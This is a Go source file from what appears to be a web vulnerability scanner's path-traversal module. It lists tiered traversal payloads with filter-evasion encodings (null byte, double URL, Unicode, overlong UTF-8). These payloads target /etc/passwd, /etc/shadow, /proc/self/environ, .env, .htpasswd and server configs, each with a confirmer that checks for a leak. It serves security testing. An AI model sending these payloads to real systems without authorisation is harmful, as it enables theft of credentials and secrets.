package lfi_path_traversal

import "github.com/vigolium/vigolium/pkg/modules/shared/filesig"

// lfiPayload represents a path traversal payload with the structural confirmer
// that decides whether the response actually leaked the targeted file. The
// confirmer (shared filesig package) requires the file's real content shape and
// subtracts the baseline, replacing the former bare-word `markers` list that
// matched ordinary English and JSON keys on non-file pages.
type lfiPayload struct {
	payload string
	confirm filesig.ConfirmFunc
}

// tier1Payloads are always tested. Each targets a well-known OS file.
var tier1Payloads = []lfiPayload{
	// Linux /etc/passwd — multiple traversal depths
	{payload: "../../../../etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../../../etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../../../../../../../../../etc/passwd", confirm: filesig.ConfirmPasswd},

	// Null byte injection (bypass extension append)
	{payload: "../../../../etc/passwd%00", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../etc/passwd%00.jpg", confirm: filesig.ConfirmPasswd},
	{payload: "../../../../etc/passwd%00.html", confirm: filesig.ConfirmPasswd},

	// Double URL encoding
	{payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", confirm: filesig.ConfirmPasswd},

	// Unicode encoding bypass
	{payload: "%u002e%u002e/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", confirm: filesig.ConfirmPasswd},

	// Overlong UTF-8 encoding
	{payload: "%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd", confirm: filesig.ConfirmPasswd},

	// Backslash variants (Windows IIS)
	{payload: `..\..\..\..\etc\passwd`, confirm: filesig.ConfirmPasswd},

	// Dot-dot-slash with filter bypass
	{payload: "....//....//....//....//etc/passwd", confirm: filesig.ConfirmPasswd},
	{payload: "./.././.././.././.././../etc/passwd", confirm: filesig.ConfirmPasswd},

	// Windows win.ini
	{payload: "../../../../windows/win.ini", confirm: filesig.ConfirmWinIni},
	{payload: `..\..\..\..\windows\win.ini`, confirm: filesig.ConfirmWinIni},
	{payload: "../../../../windows/win.ini%00", confirm: filesig.ConfirmWinIni},
}

// tier2CanaryFiles are tested only if tier 1 caused a (non-blocked) status code
// change, suggesting traversal works but the file differs.
var tier2CanaryFiles = []lfiPayload{
	// Linux shadow (requires root)
	{payload: "../../../../etc/shadow", confirm: filesig.ConfirmShadow},
	// Linux hosts
	{payload: "../../../../etc/hosts", confirm: filesig.ConfirmHosts},
	// Linux /proc/self/environ
	{payload: "../../../../proc/self/environ", confirm: filesig.ConfirmEnviron},
	// Linux /proc/version
	{payload: "../../../../proc/version", confirm: filesig.ConfirmProcVersion},
	// Windows boot.ini
	{payload: `..\..\..\..\boot.ini`, confirm: filesig.ConfirmBootIni},
	// Web config files
	{payload: "../../../../etc/apache2/apache2.conf", confirm: filesig.ConfirmApacheConf},
	{payload: "../../../../etc/nginx/nginx.conf", confirm: filesig.ConfirmNginxConf},
	// Java web.xml
	{payload: "../../WEB-INF/web.xml", confirm: filesig.ConfirmWebXML},
	// Git directory
	{payload: "../../../../.git/HEAD", confirm: filesig.ConfirmGitHead},
	// Application config files
	{payload: "../../../../.env", confirm: filesig.ConfirmDotenv},
	// htpasswd
	{payload: "../../../../.htpasswd", confirm: filesig.ConfirmHtpasswd},
	// Log files
	{payload: "../../../../var/log/apache2/access.log", confirm: filesig.ConfirmAccessLog},
	{payload: "../../../../var/log/nginx/access.log", confirm: filesig.ConfirmAccessLog},
}
